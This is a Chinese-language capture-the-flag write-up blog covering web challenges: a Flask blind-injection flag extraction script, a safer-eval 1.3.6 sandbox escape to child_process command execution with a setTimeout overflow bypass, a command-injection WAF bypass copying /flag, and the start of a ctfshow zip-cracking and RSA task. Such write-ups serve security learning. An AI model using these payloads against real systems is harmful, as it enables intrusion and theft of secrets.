url:</span><br><span class="line">        session[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">        session[<span class="string">&#x27;url&#x27;</span>] = url</span><br><span class="line">        session[<span class="string">&quot;admin&quot;</span>]=<span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;admin&quot;</span>,<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(__file__).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>,data=session.get(<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;Not find data...&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getkey&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        session[<span class="string">&quot;key&quot;</span>]=SECRET_KEY</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def getkey():</span></span><br><span class="line"><span class="string">    if request.method != &quot;GET&quot;:</span></span><br><span class="line"><span class="string">        session[&quot;key&quot;]=SECRET_KEY&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_hindd_result&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hindd_result</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;data&#x27;</span>] <span class="keyword">and</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file:&#x27;</span> <span class="keyword">in</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br><span class="line">        data=(session[<span class="string">&#x27;data&#x27;</span>]).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        url_text=urllib.request.urlopen(session[<span class="string">&#x27;url&#x27;</span>]).read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> url_text <span class="keyword">in</span> data <span class="keyword">or</span> data <span class="keyword">in</span> url_text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you get it&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;what ???&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getflag&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    res = flag.waf(request)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>思路就是通过&#x2F;get_hindd_result路由进行盲注。</p><p>因为直接getflag他没回显啊？！</p><p>file过滤可以大小写绕过</p><p>尝试一下File:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ     NSSCTF发现可行</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105083934681.png" alt="image-20250105083934681"></p><p>接下来编写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload_sum=string.ascii_lowercase+string.digits+<span class="string">&#x27;&#123;&#125;-&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload_sum)</span><br><span class="line">target=<span class="string">&#x27;http://node4.anna.nssctf.cn:28374/&#x27;</span></span><br><span class="line">payload_data=<span class="string">&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">payload_url=<span class="string">&quot;File:///proc/1/environ&quot;</span></span><br><span class="line">target_get_data=target+<span class="string">&#x27;get_data&#x27;</span></span><br><span class="line">target_get_flag=target+<span class="string">&#x27;get_hindd_result&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload_sum:</span><br><span class="line">        temp=payload_data+j</span><br><span class="line">        <span class="comment">#print(j)</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        session.post(target_get_data,data=&#123;<span class="string">&#x27;data&#x27;</span>:temp,<span class="string">&#x27;url&#x27;</span>:payload_url,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;%E6%8F%90%E4%BA%A4&#x27;</span>&#125;)</span><br><span class="line">        response=session.get(target_get_flag,cookies=&#123;<span class="string">&#x27;session&#x27;</span>:<span class="built_in">str</span>(session.cookies.values())[<span class="number">2</span>:-<span class="number">2</span>]&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(str(session.cookies.values())[2:-2])</span></span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;you get it&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            payload_data+=j</span><br><span class="line">            <span class="built_in">print</span>(payload_data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bad!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>脚本编写能力还是太差了，写了半天。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;710ce1eb-8431-41e6-83fa-3213a14db9fc&#125;</span><br></pre></td></tr></table></figure><h2 id="GKCTF-2020-ez三剑客-easynode"><a href="#GKCTF-2020-ez三剑客-easynode" class="headerlink" title="[GKCTF 2020]ez三剑客-easynode"></a>[GKCTF 2020]ez三剑客-easynode</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160042913.png" alt="image-20250105160042913" style="zoom:80%;" /><p>发现一个safer-eval 1.3.6版本，存在沙箱逃逸的漏洞。</p><p>下面看看源代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&#x27;safer-eval&#x27;</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">path</span> === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">next</span>(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/eval&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title class_">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/version&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在&#x2F;eval路由下存在safeeval的rce，但是if (req.path &#x3D;&#x3D;&#x3D; ‘&#x2F;eval’) {，此处存在大时间的延迟，然而他是考setTimeout来进行的，可以通过</p><p>大于2147483647的数来绕过。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160338220.png" alt="image-20250105160338220"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=(function () &#123;</span><br><span class="line"></span><br><span class="line">const process = clearImmediate.constructor(&#x27;return process;&#x27;)();</span><br><span class="line"></span><br><span class="line">return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&#125;)()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;970473a7-7ad6-4826-9a42-492ec0dcf96a&#125;</span><br></pre></td></tr></table></figure><h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response </span><br><span class="line"><span class="keyword">import</span> uuid </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="comment"># flag in /flag </span></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>): </span><br><span class="line">black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span> </span><br><span class="line"><span class="keyword">for</span> black <span class="keyword">in</span> black_list: </span><br><span class="line"><span class="keyword">if</span> black <span class="keyword">in</span> rce: </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>): </span><br><span class="line">nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>) </span><br><span class="line"><span class="keyword">if</span> waf(nss): </span><br><span class="line">os.popen(nss) </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;waf&quot;</span> </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/source&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read() </span><br><span class="line"><span class="keyword">return</span> src </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ňśś=cp $(cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;echo $(pwd)flag) app.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ňśś=cp%09%24%28cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26echo%09%24%28pwd%29flag%29%09app.py</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow元旦渗透赛wp</title>
      <link href="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/"/>
      <url>/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h2 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h2><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/message1.jpg" alt="img" style="zoom:67%;" /><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/task1.jpg" alt="img" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交压缩包的密码</span><br></pre></td></tr></table></figure><p>首先获得的是一个压缩包，但是加密了。我们丢到passware里爆破一下。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072428317.png" class="" title="This is an example image"><p>直接出了，密码654321</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072458023.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交任务中心的网址</span><br></pre></td></tr></table></figure><p>获得一串base64编码后的数据，解码一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> secretMessageResponse</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">import</span> pip</span><br><span class="line">        pip.main([<span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;secretMessageResponse&#x27;</span>])</span><br><span class="line">        <span class="keyword">from</span> secretMessageResponse <span class="keyword">import</span> printMessage</span><br></pre></td></tr></table></figure><p>直接丢到python运行试试。返回结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-12-16</span><br><span class="line">gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-04-11</span><br><span class="line">Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请使用组织分配的私钥解密后使用</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-03-05</span><br><span class="line">ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure><p>同时题目给了npq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure><p>给了npq，e默认，那么私钥自然而然其实就有了。</p><figure class="highlight python"><table><tr><td 